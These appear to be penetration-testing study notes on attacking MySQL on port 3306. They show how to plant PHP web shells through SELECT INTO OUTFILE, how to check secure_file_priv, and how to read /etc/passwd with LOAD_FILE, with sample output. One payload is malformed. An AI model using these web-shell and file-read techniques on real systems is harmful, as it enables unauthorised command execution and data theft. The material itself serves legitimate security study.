---
title: Port 3306 - MySQL
draft: false
tags:
  - mysql
---
What are the default databases?

`mysql`: System database. Contains tables informaiton. 

`information_schema`: Provides access to the DB metadata.

`performace_schema`: Monitors MySQL Server execution.

`sys`: Helps DBA and developers with interpreting data collected from performance schema.

## Syntax

Show database:

`SHOW DATABASES`

Select Database:

`USE users;`

Show tables:

`SHOW TABLES;`

Select all Data from table users:

`SELECT * FROM users;`

## CME

MySQL doesn't have stored procedures such as xp_cmdshell. 

Attacker can still achieve CME by writing to a location in the file system that can execute the commands. 

Attacker can use [SELECT INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/) in the webserver directory.

Then we can browse to the location where the file is and execute the command. 

### Write Local File

```shell-session
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';

Query OK, 1 row affected (0.001 sec)
```

```shell-session
mysql> SELECT "<?php system($_GET['cmd'];?)>" INTO OUTFILE 'C:\xampp\htdocs\shell.php';

Query OK, 1 row affected (0.001 sec)
```

```

`secure_file_priv` limits the effect of the data import and export operations such as `LOAD DATA` AND `SELECT ,,, INTO OUTFILE`.

`secure_file_priv` may be set as follows:

- If **empty**, the variable has no effect, which is not a secure setting.
- If **set to the name of a directory**, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
- If set to **NULL**, the server disables import and export operations.

Let's check on `secure_file_priv`:

```shell-session
mysql> show variables like "secure_file_priv";

+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+

1 row in set (0.005 sec)
```

It is set as empty. We should be able to write commands to a file. 

## Read Local Files


MSSQL by default, user with read access can read any files on the Operating System. 

But MySQL doesn't allow arbitrary file read by default. 

But we can still read files if lucky using the following method:

```shell-session
mysql> select LOAD_FILE("/etc/passwd");

+--------------------------+
| LOAD_FILE("/etc/passwd")
+--------------------------------------------------+
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
```


